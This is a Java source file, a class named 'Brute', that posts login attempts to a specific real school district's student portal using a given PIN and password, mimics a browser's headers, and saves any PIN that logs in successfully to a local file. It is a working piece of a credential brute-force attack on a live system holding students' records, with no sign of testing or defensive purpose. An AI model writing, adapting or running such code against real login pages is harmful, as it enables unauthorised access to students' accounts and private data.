import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;

import java.util.Map;
import java.io.*;
public class Brute
{
    // HTTP POST request
    private final static String USER_AGENT = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/39.0";
    
    public static boolean sendPost(String id, String password) throws Exception {

        String url = "https://sisweb.resa.net/StudentPortal/Home/Login";
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();

        //add request header
        con.setRequestMethod("POST");

        con.setRequestProperty("Host", "sisweb.resa.net");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept", "*/*");
        con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
        con.setRequestProperty("Accept-Encoding", "gzip, deflate");
        con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        con.setRequestProperty("X-Requested-With", "XMLHttpsRequest");
        con.setRequestProperty("Referer", "https://sisweb.resa.net/StudentPortal/");
        con.setRequestProperty("Content-Length", "46");
        con.setRequestProperty("Pragma", "no-cache");
        con.setRequestProperty("Cache-Control", "no-cache");

        String urlParameters = "districtid=47010&Pin=" + id + "&Password=" + password;
        
        // Send post request
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();

        int responseCode = con.getResponseCode();

        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
        
        String inputLine;
        StringBuffer response = new StringBuffer();

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        System.out.print(id + " ");
        if (response.toString().indexOf("1") != -1) {
            //found it
            PrintWriter pw = new PrintWriter(new File("thingy.txt"));
            pw.print(id);
            pw.close();
            return true;
        } else {
            //not found
            return false;
        }

    }
}
